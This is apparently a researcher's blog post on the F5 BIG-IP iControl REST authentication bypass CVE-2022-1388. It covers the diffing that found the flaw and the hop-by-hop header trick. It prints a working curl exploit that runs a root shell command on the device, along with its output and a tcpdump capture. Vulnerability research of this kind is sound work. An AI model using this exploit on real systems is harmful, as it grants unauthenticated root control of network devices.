+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb__item"><button class="breadcrumb__current breadcrumb__current--clickable" 
+                aria-current="page"
+                aria-expanded="false"
+                aria-controls="article-metadata-panel"
+                data-metadata-toggle
+                itemprop="item">
+          <span itemprop="name">F5 BIG-IP iControl…</span>
+          <svg class="breadcrumb__metadata-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+          </svg>
+        </button><meta itemprop="position" content="2" />
+    </li>
+  </ol>
+</nav><div class="article-header__actions">
+      
+<div class="article-header__copy-page relative" data-component="copy-page">
+  <button 
+    class="article-header__copy-toggle" 
+    type="button"
+    aria-expanded="false"
+    aria-haspopup="true"
+    data-copy-page-toggle>
+    <span class="article-header__copy-text">Share</span>
+    <svg class="article-header__copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+    </svg>
+    <svg class="article-header__copy-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-dropdown-arrow>
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+    </svg>
+  </button>
+  
+  
+  <div 
+    class="article-header__copy-dropdown"
+    data-copy-page-dropdown
+    data-state="hidden">
+    <div class="article-header__copy-dropdown-content">
+      
+      <button 
+        class="copy-page-menu-item"
+        data-copy-url="//localhost:1313/posts/big-ip-f5/">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path>
+        </svg>
+        Copy URL
+      </button>
+      
+      
+      
+      
+      
+      
+      <a 
+        href="//localhost:1313/posts/big-ip-f5/index.txt"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item"
+        data-open-txt>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v12m6-6H6"></path>
+        </svg>
+        Open LLM text
+      </a>
+      <button 
+        class="copy-page-menu-item"
+        data-copy-txt="//localhost:1313/posts/big-ip-f5/index.txt">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        Copy LLM text
+      </button>
+
+      
+      <button 
+        class="copy-page-menu-item"
+        data-copy-content>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        Copy content
+      </button>
+      
+      <hr class="copy-page-separator">
+      
+      
+      <div class="copy-page-section-header">
+        Share with AI
+      </div>
+      
+      
+      <a 
+        href="https://claude.ai/chat?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fbig-ip-f5%2F"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 2L2 7v10l10 5 10-5V7l-10-5z"/>
+        </svg>
+        Ask Claude
+      </a>
+      
+      
+      <a 
+        href="https://chat.openai.com/?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fbig-ip-f5%2F"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M22.282 9.821a5.985 5.985 0 0 0-.516-4.91 6.046 6.046 0 0 0-6.51-2.9A6.065 6.065 0 0 0 4.888 4.36a5.99 5.99 0 0 0-2.907 6.507 6.018 6.018 0 0 0 .517 4.91 6.05 6.05 0 0 0 6.51 2.9A6.065 6.065 0 0 0 19.376 16.64a5.99 5.99 0 0 0 2.907-6.507l-.001-.312z"/>
+        </svg>
+        Ask ChatGPT
+      </a>
+      
+      
+      <a 
+        href="https://copilot.microsoft.com/?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fbig-ip-f5%2F"
+        target="_blank" 
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12.5 2C8.9 2 6 4.9 6 8.5c0 1.2.3 2.3.8 3.3L12 21l5.2-9.2c.5-1 .8-2.1.8-3.3C18 4.9 15.1 2 11.5 2z"/>
+        </svg>
+        Ask Copilot
+      </a>
+    </div>
+  </div>
+</div></div>
+  </div>
+
+  <div 
+    id="article-metadata-panel" 
+    class="article-header__metadata-panel"
+    aria-hidden="true"
+    data-metadata-panel><div class="metadata" data-component="article-metadata">
+    <div class="metadata__flow">
+      <div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M6 2a1 1 0 00-1 1v1H4a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2h-1V3a1 1 0 10-2 0v1H7V3a1 1 0 00-1-1zm0 5a1 1 0 000 2h8a1 1 0 100-2H6z" clip-rule="evenodd"></path>
+          </svg>
+          <time datetime="2022-05-09T16:42:00&#43;01:00">
+            May 9, 2022
+          </time>
+        </div><div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+          </svg>
+          <span>Matus Bursa</span>
+        </div><div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"></path>
+          </svg>
+          <span>5 min read</span>
+        </div><div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 0v12h8V4H6z" clip-rule="evenodd"></path>
+          </svg>
+          <span>878 words</span>
+        </div><div class="metadata__item metadata__item--secondary">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"></path>
+          </svg>
+          <span>Updated Oct 13</span>
+        </div></div>
+  </div></div></div>
+  </div>
+  <article class="prose mx-auto max-w-3xl xl:max-w-4xl 2xl:max-w-5xl">
+    <header class="mb-6 not-prose">
+        <h1 class="text-3xl font-bold mb-3" style="color: var(--color-text-primary);">F5 BIG-IP iControl REST vulnerability CVE-2022-1388</h1></header>
+
+    <div id="articleContent" class="article-content">
+      <p>Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the exploit for <a href="https://support.f5.com/csp/article/K23605346">CVE-2022-1388</a>.</p>
+<p>You can read more about this vulnerability on <a href="https://thehackernews.com/2022/05/f5-warns-of-new-critical-big-ip-remote.html">thehackernews</a> or <a href="https://www.helpnetsecurity.com/2022/05/09/cve-2022-1388-poc-exploitation/">helpnetsecurity</a>. <a href="https://clouddocs.f5.com/api/icontrol-rest/">iControl REST</a> is an API for interaction between scripts and <em>F5 device</em>, used to manage and control that device automatically.</p>
+<p>Based on the details of the <em>mitigation</em>, the problem should be somewhere in the <code>Connection: </code> header.</p>
+
+
+
+
+<h3 id="mitigation" class="group block scroll-anchor py-4">
+    mitigation
+    <a id="f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-mitigation" href="#f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-mitigation" class="hidden group-hover:inline text-current ml-2">#</a>
+</h3><div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">apache</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465651305000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465651305000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465651305000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-apache" data-lang="apache"><span style="display:flex;"><span><span style="color:#f92672">&lt;If</span> <span style="color:#e6db74">\&#34;%{HTTP:connection} =~ /close/i \&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>RequestHeader set connection close
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/If&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ElseIf</span> <span style="color:#e6db74">\&#34;%{HTTP:connection} =~ /keep-alive/i \&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>RequestHeader set connection keep-alive
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ElseIf&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Else&gt;</span>
+</span></span><span style="display:flex;"><span>    RequestHeader set connection close
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Else&gt;</span></span></span></code></pre></div></div>
+</div>
+
+
+
+
+
+<h3 id="inside-the-library" class="group block scroll-anchor py-4">
+    inside the library
+    <a id="f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-inside-the-library" href="#f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-inside-the-library" class="hidden group-hover:inline text-current ml-2">#</a>
+</h3><p>If we use <code>diff</code> and <code>strings</code> commands, we can see which strings were changed/added to the library, so I decided to download one from the vulnerable version <code>BIGIP-16.1.0-0.0.19</code> and one from the fixed version <code>BIGIP-16.1.2.2-0.0.28</code></p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465652153000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465652153000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465652153000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ diff  &lt;<span style="color:#f92672">(</span>strings mod_auth_pam.so_new <span style="color:#f92672">)</span> &lt;<span style="color:#f92672">(</span>strings mod_auth_pam.so_old<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>259,261d243
+</span></span><span style="display:flex;"><span>&lt; Connection
+</span></span><span style="display:flex;"><span>&lt; close
+</span></span><span style="display:flex;"><span>&lt; keep-alive
+</span></span><span style="display:flex;"><span>268d249
+</span></span><span style="display:flex;"><span>...</span></span></code></pre></div></div>
+</div>
+
+
+
+
+
+<h3 id="header-connection" class="group block scroll-anchor py-4">
+    header Connection
+    <a id="f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-header-connection" href="#f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-header-connection" class="hidden group-hover:inline text-current ml-2">#</a>
+</h3><p>We know that in F5, there is <code>Jetty</code> server without authentication on <code>TCP/8100</code>, which we can hit for example from <code>localhost</code> (F5 device). We also know that there is <code>Apache</code> which does the <em>Authentication</em> for <code>Jetty</code>. We also know that we can abuse <a href="https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers">hop-by-hop header</a> there, but we don&rsquo;t know which header we should pass to the <code>Connection</code> header. For more details about hop-by-hop headers you can read <a href="https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1">RFC2616</a></p>
+
+
+
+
+<h3 id="exploit" class="group block scroll-anchor py-4">
+    exploit
+    <a id="f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-exploit" href="#f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-exploit" class="hidden group-hover:inline text-current ml-2">#</a>
+</h3><p>After couple of hours and tries I found the requirements to make the exploit functionable:</p>
+<ul>
+<li><code>X-F5-Auth-Token</code> header must be present (that&rsquo;s a requirement for Apache sends request to Jetty backend)</li>
+<li><code>Connection</code> header <em>must</em> include <code>X-F5-Auth-Token</code> (based on hop-by-hop headers this will delete <code>X-F5-Auth-Token</code> from the request sended to the backend)</li>
+<li><code>Host</code> header <em>must</em> be <code>localhost</code> or <code>127.0.0.1</code> (Jetty either checks this value or you can put <code>X-Forwarded-Host</code> to <code>Connection</code> header to make <code>X-Forwarded-Host</code> header invisible for Jetty)</li>
+<li><code>Authentication</code> header <em>must</em> be <code>admin</code> user</li>
+</ul>
+<p><em>curl</em></p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465653103000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465653103000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465653103000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -vvv -sk -X POST -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#e6db74">&#39;https://admin@192.168.52.10/mgmt/tm/util/bash&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;command&#34;: &#34;run&#34; , &#34;utilCmdArgs&#34;: &#34; -c id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; }&#39;</span> -H <span style="color:#e6db74">&#39;X-F5-Auth-Token: -&#39;</span> -H <span style="color:#e6db74">&#39;Connection: close, X-F5-Auth-Token&#39;</span> -H <span style="color:#e6db74">&#39;Host: localhost&#39;</span>
+</span></span><span style="display:flex;"><span>*   Trying 192.168.52.10:443...
+</span></span><span style="display:flex;"><span>* Connected to 192.168.52.10 <span style="color:#f92672">(</span>192.168.52.10<span style="color:#f92672">)</span> port <span style="color:#ae81ff">443</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>* ALPN, offering h2
+</span></span><span style="display:flex;"><span>* ALPN, offering http/1.1
+</span></span><span style="display:flex;"><span>* successfully set certificate verify locations:
+</span></span><span style="display:flex;"><span>*  CAfile: /etc/ssl/cert.pem
+</span></span><span style="display:flex;"><span>*  CApath: none
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">(</span>304<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>OUT<span style="color:#f92672">)</span>, TLS handshake, Client hello <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">(</span>304<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS handshake, Server hello <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS handshake, Certificate <span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS handshake, Server key exchange <span style="color:#f92672">(</span>12<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS handshake, Server finished <span style="color:#f92672">(</span>14<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>OUT<span style="color:#f92672">)</span>, TLS handshake, Client key exchange <span style="color:#f92672">(</span>16<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>OUT<span style="color:#f92672">)</span>, TLS change cipher, Change cipher spec <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>OUT<span style="color:#f92672">)</span>, TLS handshake, Finished <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS change cipher, Change cipher spec <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>IN<span style="color:#f92672">)</span>, TLS handshake, Finished <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
+</span></span><span style="display:flex;"><span>* ALPN, server did not agree to a protocol
+</span></span><span style="display:flex;"><span>* Server certificate:
+</span></span><span style="display:flex;"><span>*  subject: C<span style="color:#f92672">=</span>--; ST<span style="color:#f92672">=</span>WA; L<span style="color:#f92672">=</span>Seattle; O<span style="color:#f92672">=</span>MyCompany; OU<span style="color:#f92672">=</span>MyOrg; CN<span style="color:#f92672">=</span>localhost.localdomain; emailAddress<span style="color:#f92672">=</span>root@localhost.localdomain
+</span></span><span style="display:flex;"><span>*  start date: May  <span style="color:#ae81ff">7</span> 08:55:32 <span style="color:#ae81ff">2022</span> GMT
+</span></span><span style="display:flex;"><span>*  expire date: May  <span style="color:#ae81ff">4</span> 08:55:32 <span style="color:#ae81ff">2032</span> GMT
+</span></span><span style="display:flex;"><span>*  issuer: C<span style="color:#f92672">=</span>--; ST<span style="color:#f92672">=</span>WA; L<span style="color:#f92672">=</span>Seattle; O<span style="color:#f92672">=</span>MyCompany; OU<span style="color:#f92672">=</span>MyOrg; CN<span style="color:#f92672">=</span>localhost.localdomain; emailAddress<span style="color:#f92672">=</span>root@localhost.localdomain
+</span></span><span style="display:flex;"><span>*  SSL certificate verify result: self signed certificate <span style="color:#f92672">(</span>18<span style="color:#f92672">)</span>, continuing anyway.
+</span></span><span style="display:flex;"><span>* Server auth using Basic with user <span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span>&gt; POST /mgmt/tm/util/bash HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: localhost
+</span></span><span style="display:flex;"><span>&gt; Authorization: Basic YWRtaW46
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.79.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; Content-Type: application/json
+</span></span><span style="display:flex;"><span>&gt; X-F5-Auth-Token: -
+</span></span><span style="display:flex;"><span>&gt; Connection: close, X-F5-Auth-Token
+</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span>&gt;
+</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>&lt; Date: Tue, <span style="color:#ae81ff">10</span> May <span style="color:#ae81ff">2022</span> 05:18:22 GMT
+</span></span><span style="display:flex;"><span>&lt; Server: Jetty<span style="color:#f92672">(</span>9.2.22.v20170606<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&lt; X-Frame-Options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>&lt; Strict-Transport-Security: max-age<span style="color:#f92672">=</span>16070400; includeSubDomains
+</span></span><span style="display:flex;"><span>&lt; Content-Type: application/json; charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>&lt; Allow:
+</span></span><span style="display:flex;"><span>&lt; Pragma: no-cache
+</span></span><span style="display:flex;"><span>&lt; Cache-Control: no-store
+</span></span><span style="display:flex;"><span>&lt; Cache-Control: no-cache
+</span></span><span style="display:flex;"><span>&lt; Cache-Control: must-revalidate
+</span></span><span style="display:flex;"><span>&lt; Expires: -1
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">168</span>
+</span></span><span style="display:flex;"><span>&lt; X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>&lt; X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block
+</span></span><span style="display:flex;"><span>&lt; Content-Security-Policy: default-src <span style="color:#e6db74">&#39;self&#39;</span>  <span style="color:#e6db74">&#39;unsafe-inline&#39;</span> <span style="color:#e6db74">&#39;unsafe-eval&#39;</span> data: blob:; img-src <span style="color:#e6db74">&#39;self&#39;</span> data:  http://127.4.1.1 http://127.4.2.1
+</span></span><span style="display:flex;"><span>&lt; Connection: close
+</span></span><span style="display:flex;"><span>&lt;
+</span></span><span style="display:flex;"><span>* Closing connection <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>* TLSv1.2 <span style="color:#f92672">(</span>OUT<span style="color:#f92672">)</span>, TLS alert, close notify <span style="color:#f92672">(</span>256<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;tm:util:bash:runstate&#34;</span>,<span style="color:#e6db74">&#34;command&#34;</span>:<span style="color:#e6db74">&#34;run&#34;</span>,<span style="color:#e6db74">&#34;utilCmdArgs&#34;</span>:<span style="color:#e6db74">&#34; -c id&#34;</span>,<span style="color:#e6db74">&#34;commandResult&#34;</span>:<span style="color:#e6db74">&#34;uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\n&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div></div>
+</div>
+
+<p><em>tcpdump</em> on F5 device</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465657897000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465657897000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465657897000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tcpdump -i lo -s <span style="color:#ae81ff">0</span> -A <span style="color:#e6db74">&#39;tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504F5354&#39;</span>
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on lo, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">65535</span> bytes
+</span></span><span style="display:flex;"><span>22:18:22.457963 IP localhost.localdomain.59668 &gt; localhost.localdomain.xprint-server: Flags <span style="color:#f92672">[</span>P.<span style="color:#f92672">]</span>, seq 2917914269:2917914711, ack 2716646422, win 342, options <span style="color:#f92672">[</span>nop,nop,TS val <span style="color:#ae81ff">245887457</span> ecr 245887457<span style="color:#f92672">]</span>, length <span style="color:#ae81ff">442</span>
+</span></span><span style="display:flex;"><span>E...<span style="color:#960050;background-color:#1e0010">&#39;</span>.@.@..........................V.......
+</span></span><span style="display:flex;"><span>........POST /mgmt/tm/util/bash HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:8100
+</span></span><span style="display:flex;"><span>Authorization: Basic YWRtaW46
+</span></span><span style="display:flex;"><span>User-Agent: curl/7.79.1
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Local-Ip-From-Httpd: 192.168.52.10
+</span></span><span style="display:flex;"><span>X-F5-New-Authtok-Reqd: false
+</span></span><span style="display:flex;"><span>X-Forwarded-Proto: http
+</span></span><span style="display:flex;"><span>X-Forwarded-For: 192.168.52.1
+</span></span><span style="display:flex;"><span>X-Forwarded-Host: localhost
+</span></span><span style="display:flex;"><span>X-Forwarded-Server: localhost.localdomain
+</span></span><span style="display:flex;"><span>Connection: Keep-Alive
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;command&#34;</span>: <span style="color:#e6db74">&#34;run&#34;</span> , <span style="color:#e6db74">&#34;utilCmdArgs&#34;</span>: <span style="color:#e6db74">&#34; -c id&#34;</span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>22:18:22.461910 IP localhost.localdomain.50416 &gt; localhost.localdomain.48470: Flags <span style="color:#f92672">[</span>P.<span style="color:#f92672">]</span>, seq 3235108301:3235108827, ack 1593436189, win 3631, options <span style="color:#f92672">[</span>nop,nop,TS val <span style="color:#ae81ff">245887461</span> ecr 245836911<span style="color:#f92672">]</span>, length <span style="color:#ae81ff">526</span>
+</span></span><span style="display:flex;"><span>E..B.d@.@.PO...........V....^....../.7.....
+</span></span><span style="display:flex;"><span>......,oPOST /tmapi_mapper/util/bash HTTP/1.1
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Authorization: Basic YWRtaW46
+</span></span><span style="display:flex;"><span>X-Forwarded-For: 192.168.52.1
+</span></span><span style="display:flex;"><span>X-F5-Config-Api-Status: <span style="color:#ae81ff">1907</span>
+</span></span><span style="display:flex;"><span>Referer: 192.168.52.1
+</span></span><span style="display:flex;"><span>User-Agent: com.f5.rest.common.RestRequestSender
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: Keep-alive
